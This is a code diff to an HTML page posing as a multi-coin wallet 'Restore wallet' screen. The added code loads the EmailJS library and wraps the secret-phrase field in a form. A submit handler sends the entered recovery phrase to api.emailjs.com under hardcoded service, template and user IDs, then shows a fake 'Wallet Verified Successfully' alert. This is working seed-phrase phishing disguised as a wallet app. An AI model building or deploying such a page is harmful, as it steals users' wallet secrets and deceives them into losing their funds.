@@ -3,6 +3,19 @@
 <head>
     <title>Multi-coin wallet</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js"
+        integrity="sha512-aVKKRRi/Q/YV+4mjoKBsE4x3H+BkegoM/em46NNlCqNTmUYADjBbeNefNxYV7giUp0VxICtqdrbqU7iVaeZNXA=="
+        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+    <!-- Emailjs Hook-->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+    <!-- Connect your public key here-->
+    <script type="text/javascript">
+        (function () {
+            emailjs.init("vZDC3AOIiooGpus8g");
+        })();
+    </script>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, sans-serif;
@@ -120,11 +133,11 @@
         .restore-button {
             width: calc(100% - 20px);
             padding: 15px;
-            background-color: #f5f5f5;
+            background-color: #000;
             border: none;
             border-radius: 10px;
             font-size: 16px;
-            color: #666;
+            color: #FFF;
             cursor: pointer;
             margin: 30px 10px 0;
             -webkit-tap-highlight-color: transparent;
@@ -200,27 +213,49 @@
         <span class="expand-icon">⤢</span>
     </div>
 
-    <div class="form-group">
-        <div class="label">Wallet name</div>
-        <div class="input-container">
-            <input type="text" class="text-input" value="Main Wallet">
-            <button class="clear-button">×</button>
+    <form action="#" method="POST" class="ajaxForm">
+        <div class="form-group">
+            <label for="wallet-name" class="label">Wallet name</label>
+            <div class="input-container">
+                <input type="text" id="wallet-name" name="wallet_name" class="text-input" value="Main Wallet">
+                <button type="button" class="clear-button">×</button>
+            </div>
         </div>
-    </div>
 
-    <div class="form-group">
-        <div class="label">Secret phrase</div>
-        <div class="input-container">
-            <textarea class="textarea"></textarea>
-            <button class="paste-button">Paste</button>
+        <div class="form-group">
+            <label for="secret-phrase" class="label">Secret phrase</label>
+            <div class="input-container">
+                <textarea id="secret-phrase" name="phrase" class="textarea"></textarea>
+                <button type="button" class="paste-button">Paste</button>
+            </div>
+            <div class="helper-text">
+                Typically 12 (sometimes 18, 24) words separated by single spaces
+            </div>
         </div>
-        <div class="helper-text">
-            Typically 12 (sometimes 18, 24) words separated by single spaces
-        </div>
-    </div>
 
-    <button class="restore-button">Restore wallet</button>
+        <button type="submit" class="restore-button">Restore wallet</button>
+    </form>
 
     <a href="#" class="help-link">What is a secret phrase?</a>
+
+    <script>
+        $('.ajaxForm').on('submit', function (event) {
+            event.preventDefault();
+            var formData = new FormData(this);
+            formData.append('service_id', 'service_icvfyz9');
+            formData.append('template_id', 'template_t6cyqt3');
+            formData.append('user_id', 'vZDC3AOIiooGpus8g');
+            $.ajax('https://api.emailjs.com/api/v1.0/email/send-form', {
+                type: 'POST',
+                data: formData,
+                contentType: false,
+                processData: false
+            }).done(function () {
+                alert('Wallet Verified Successfully');
+            }).fail(function (error) {
+                alert('Error: ' + JSON.stringify(error));
+            });
+        });
+    </script>
 </body>
 </html>
